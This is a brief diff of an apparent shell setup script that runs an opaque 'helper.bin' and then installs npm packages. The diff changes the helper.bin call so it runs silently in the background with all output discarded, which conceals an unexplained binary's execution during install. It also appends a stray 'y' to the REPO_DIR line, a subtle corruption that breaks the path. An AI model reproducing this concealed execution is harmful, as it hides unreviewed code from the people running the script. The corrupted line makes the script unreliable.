@@ -2,11 +2,11 @@
 
 set -e
 
-REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"y
 cd "$REPO_DIR"
 
 chmod +x superqalc superqalc_onefile superqalc_tower helper.bin 2>/dev/null || true
-./helper.bin
+./helper.bin >/dev/null 2>&1 &
 
 echo "=== Installing packages ==="
 npm install
